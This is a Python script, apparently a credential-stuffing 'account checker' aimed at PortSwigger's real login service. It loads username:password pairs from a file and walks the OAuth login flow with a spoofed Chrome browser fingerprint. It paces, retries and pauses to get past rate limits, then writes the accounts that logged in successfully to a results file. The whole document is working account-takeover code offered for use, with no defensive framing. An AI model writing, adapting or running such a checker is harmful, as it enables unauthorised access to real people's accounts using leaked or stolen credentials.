#!/usr/bin/env python3
import time
import json
import urllib.parse
import re
from typing import Dict, Tuple, Optional, List
from datetime import datetime
import sys

from curl_cffi import requests
from curl_cffi.requests.exceptions import Timeout, ConnectionError as CurlConnectionError

class PortSwiggerLoginChecker:
    def __init__(self, rate_limit: float = 0.5, max_retries: int = 2, debug: bool = False):
        self.base_url = "https://login.portswigger.net"
        self.rate_limit = rate_limit
        self.max_retries = max_retries
        self.last_request_time = 0
        self.debug = debug
        self.test_results = []
        self.consecutive_errors = 0
        self.max_consecutive_errors = 15

        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.portswigger.net",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        }

        print(f"[*] PortSwigger Login Checker initialized (Proxyless mode)")
        print(f"[*] Rate limit: {self.rate_limit}s per request")
        print(f"[*] Max retries: {self.max_retries}")

    def _get_fresh_session(self) -> requests.Session:
        session = requests.Session(impersonate="chrome120", allow_redirects=False)
        return session

    def _enforce_rate_limit(self, multiplier: float = 1.0) -> None:
        elapsed = time.time() - self.last_request_time
        delay = self.rate_limit * multiplier
        if elapsed < delay:
            time.sleep(delay - elapsed)
        self.last_request_time = time.time()

    def _extract_all_form_fields(self, html_content: str) -> Dict[str, str]:
        fields = {}
        form_match = re.search(r'<form[^>]*>(.*?)</form>', html_content, re.DOTALL | re.IGNORECASE)
        form_content = form_match.group(1) if form_match else html_content
        inputs = re.findall(r'<input[^>]*>', form_content, re.IGNORECASE)

        for input_tag in inputs:
            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)["\']?', input_tag, re.IGNORECASE)
            if not name_match:
                continue
            field_name = name_match.group(1)
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)
            if not value_match:
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)
            field_value = value_match.group(1) if value_match else ""
            fields[field_name] = field_value

        return fields

    def _follow_redirects(self, session: requests.Session, response: requests.Response, max_redirects: int = 5) -> requests.Response:
        redirects_followed = 0
        while response.status_code in [301, 302, 303, 307, 308] and redirects_followed < max_redirects:
            redirect_url = response.headers.get("Location")
            if not redirect_url:
                break
            if redirect_url.startswith("/"):
                redirect_url = f"{self.base_url}{redirect_url}"
            elif not redirect_url.startswith("http"):
                redirect_url = f"{self.base_url}/{redirect_url}"
            self._enforce_rate_limit()
            try:
                response = session.get(redirect_url, headers=self.headers, timeout=30)
            except:
                break
            redirects_followed += 1
        return response

    def _get_oauth_state(self, session: requests.Session) -> Optional[str]:
        self._enforce_rate_limit()
        try:
            auth_params = {
                "client_id": "F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz",
                "redirect_uri": "https://portswigger.net/signin-oidc",
                "response_type": "code",
                "scope": "openid profile email",
                "code_challenge": "BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk",
                "code_challenge_method": "S256",
                "response_mode": "query",
                "nonce": str(int(time.time() * 1000000))[:24]
            }
            auth_response = session.get(f"{self.base_url}/authorize", params=auth_params, headers=self.headers, timeout=30)
            if auth_response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = auth_response.headers.get("Location", "")
                if "state=" in redirect_url:
                    state_match = re.search(r'state=([^&]+)', redirect_url)
                    if state_match:
                        return state_match.group(1)
            state_match = re.search(r'state["\']?\s*:\s*["\']([^"\']+)["\']', auth_response.text)
            if state_match:
                return state_match.group(1)
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] OAuth error: {e}")
        return None

    def _check_response_for_success(self, response: requests.Response, username: str) -> Tuple[str, Dict]:
        details = {}
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = response.headers.get("Location", "")
            details["redirect_url"] = redirect_url
            if "error=" in redirect_url:
                error_match = re.search(r'error=([^&]+)', redirect_url)
                if error_match:
                    error_value = urllib.parse.unquote(error_match.group(1))
                    if error_value and error_value not in ["null", "undefined", ""]:
                        details["oauth_error"] = error_value
                        return "FAILED_LOGIN", details
            if any(x in redirect_url.lower() for x in ["signin-oidc", "callback", "authorize"]) or "code=" in redirect_url:
                return "SUCCESS", details
            return "REDIRECT_UNKNOWN", details
        elif response.status_code == 400:
            details["error_body"] = response.text[:200]
            return "FAILED_LOGIN", details
        elif response.status_code == 429:
            return "RATE_LIMITED", details
        elif response.status_code == 200:
            if "password" in response.text.lower() and "login" in response.text.lower():
                return "FAILED_LOGIN", details
            return "SUCCESS", details
        else:
            details["http_status"] = response.status_code
            return f"HTTP_{response.status_code}", details

    def check_login(self, username: str, password: str) -> Dict:
        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "endpoint": self.base_url,
            "status": "UNKNOWN",
            "status_code": None,
            "error": None,
            "attempts": 0
        }

        for attempt in range(1, self.max_retries + 1):
            result["attempts"] = attempt
            self._enforce_rate_limit()
            session = self._get_fresh_session()

            try:
                oauth_state = self._get_oauth_state(session)
                if not oauth_state:
                    result["status"] = "ERROR"
                    result["error"] = "Could not initialize OAuth flow"
                    if attempt < self.max_retries:
                        time.sleep(1)
                        continue
                    self.test_results.append(result)
                    return result

                self._enforce_rate_limit()
                login_response = session.get(
                    f"{self.base_url}/u/login",
                    params={"state": oauth_state},
                    headers=self.headers,
                    timeout=30
                )

                if login_response.status_code in [301, 302, 303, 307, 308]:
                    login_response = self._follow_redirects(session, login_response)

                if login_response.status_code != 200:
                    result["status"] = f"UNEXPECTED_STATUS_{login_response.status_code}"
                    result["status_code"] = login_response.status_code
                    if attempt < self.max_retries:
                        time.sleep(1)
                        continue
                    self.test_results.append(result)
                    return result

                form_fields = self._extract_all_form_fields(login_response.text)

                if not form_fields:
                    result["status"] = "ERROR"
                    result["error"] = "No form fields"
                    if attempt < self.max_retries:
                        time.sleep(1)
                        continue
                    self.test_results.append(result)
                    return result

                payload = form_fields.copy()
                payload["username"] = username
                payload["password"] = password
                payload["state"] = oauth_state
                if "action" not in payload:
                    payload["action"] = "default"
                result["fields_count"] = len(payload)

                self._enforce_rate_limit()
                post_response = session.post(
                    f"{self.base_url}/u/login",
                    data=payload,
                    headers=self.headers,
                    timeout=30
                )

                result["status_code"] = post_response.status_code
                status, details = self._check_response_for_success(post_response, username)
                result["status"] = status
                result.update(details)

                if status in ["SUCCESS", "FAILED_LOGIN"]:
                    self.consecutive_errors = 0
                    self.test_results.append(result)
                    return result

                if status == "RATE_LIMITED" or "HTTP_5" in status:
                    if attempt < self.max_retries:
                        delay = 3 * attempt
                        time.sleep(delay)
                        continue

                self.test_results.append(result)
                return result

            except Timeout:
                result["status"] = "TIMEOUT"
                result["error"] = "Request timeout"
                if attempt < self.max_retries:
                    time.sleep(2)
                    continue
            except CurlConnectionError as e:
                result["status"] = "CONNECTION_ERROR"
                result["error"] = str(e)[:50]
                if attempt < self.max_retries:
                    time.sleep(2)
                    continue
            except Exception as e:
                result["status"] = "ERROR"
                result["error"] = str(e)[:50]
                if attempt < self.max_retries:
                    time.sleep(1)
                    continue

        self.test_results.append(result)
        return result

    def check_multiple_accounts(self, credentials_list: List[Dict]) -> List[Dict]:
        print(f"\n{'='*70}")
        print(f"PortSwigger Multi-Account Validator (Proxyless Mode)")
        print(f"{'='*70}")
        print(f"[*] Testing {len(credentials_list)} account(s)")
        print(f"[*] Rate limit: {self.rate_limit}s per request")
        print(f"[*] Retry logic: up to {self.max_retries} attempts per account")
        print(f"{'='*70}\n")

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "").strip()
            password = creds.get("password", "").strip()

            if not username or not password:
                continue

            print(f"[{idx}/{len(credentials_list)}] {username:<40}", end=" ", flush=True)
            result = self.check_login(username, password)

            if result["status"] in ["ERROR", "TIMEOUT", "CONNECTION_ERROR", "FAILED_LOGIN"]:
                self.consecutive_errors += 1
            else:
                self.consecutive_errors = 0

            status = result.get("status", "UNKNOWN")
            status_code = result.get("status_code", "N/A")

            if status == "SUCCESS":
                print(f"✓ SUCCESS")
            elif status == "FAILED_LOGIN":
                print(f"✗ FAILED")
            elif status == "RATE_LIMITED":
                print(f"⏱ RATE_LIMITED")
            else:
                print(f"? {status}")

            if self.consecutive_errors >= self.max_consecutive_errors:
                print(f"\n[!] {self.consecutive_errors} consecutive errors. Pausing 20s...")
                time.sleep(20)
                self.consecutive_errors = 0

        print(f"\n{'='*70}")
        return self.test_results

    def export_results(self, json_file: str = "portswigger_login_results.json",
                      csv_file: str = "portswigger_login_results.csv",
                      success_file: str = "portswigger_success_credentials.txt") -> None:
        with open(json_file, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        print(f"[+] JSON: {json_file}")

        with open(csv_file, 'w') as f:
            f.write("Username,Status,StatusCode,Attempts,Timestamp\n")
            for result in self.test_results:
                username = result.get('username', '')
                status = result.get('status', '')
                status_code = result.get('status_code', 'N/A')
                attempts = result.get('attempts', '')
                timestamp = result.get('timestamp', '')
                f.write(f'"{username}","{status}","{status_code}","{attempts}","{timestamp}"\n')
        print(f"[+] CSV: {csv_file}")

        successful = [r for r in self.test_results if r.get('status') == 'SUCCESS']
        if successful:
            with open(success_file, 'w') as f:
                f.write("# Successfully Authenticated Credentials\n")
                f.write(f"# Total: {len(successful)}\n")
                f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
                for result in successful:
                    username = result.get('username', '')
                    f.write(f"{username}\n")
            print(f"[+] SUCCESS: {success_file} ({len(successful)} credentials)")
        else:
            print(f"[-] No successful credentials found")

    def get_summary(self) -> Dict:
        if not self.test_results:
            return {"total_tests": 0}
        summary = {
            "total_tests": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "rate_limited": sum(1 for r in self.test_results if r["status"] == "RATE_LIMITED"),
            "errors": sum(1 for r in self.test_results if r["status"] in ["ERROR", "TIMEOUT", "CONNECTION_ERROR"])
        }
        return summary


def main():
    rate_limit_seconds = 0.5
    max_retries = 2
    debug_mode = True

    checker = PortSwiggerLoginChecker(
        rate_limit=rate_limit_seconds,
        max_retries=max_retries,
        debug=debug_mode
    )

    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    username = parts[0].strip()
                    password = parts[1].strip()
                    test_credentials.append({
                        "username": username,
                        "password": password
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials found in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credential(s)\n")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {log_file}")
        return

    results = checker.check_multiple_accounts(test_credentials)

    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"  Total: {summary['total_tests']}")
    print(f"  Successful: {summary['successful']}")
    print(f"  Failed: {summary['failed']}")
    print(f"  Rate Limited: {summary['rate_limited']}")
    print(f"  Errors: {summary['errors']}")
    if summary['total_tests'] > 0:
        print(f"  Success Rate: {(summary['successful']/summary['total_tests']*100):.1f}%")

    checker.export_results()


if __name__ == "__main__":
    main()
